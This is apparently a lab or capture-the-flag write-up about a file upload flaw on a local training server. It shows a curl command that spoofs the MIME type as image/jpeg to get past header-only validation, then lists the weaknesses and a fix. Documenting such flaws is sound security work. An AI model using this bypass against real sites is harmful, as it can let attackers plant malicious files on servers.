# File Upload

## Page

* Url: http://192.168.56.101/?page=upload

## Enumeration

We tried to upload files with different extension and noticed the server only accepted jpeg files. We investigated further to see how the server was performing its file verification. 

## Exploitation

```
curl -X POST -F "Upload=upload" -F "uploaded=@./Resources/nani;type=image/jpeg" "http://192.168.56.101/?page=upload" | grep succes
```

```
Resources git:(main) âœ— curl -X POST -F "Upload=upload" -F "uploaded=@./nani;type=image/jpeg" "http://192.168.56.101/?page=upload" | grep succes

## Weaknesses

* No back-end file type validation
* Trust the request header

## Solution

* Implement strong file type verification
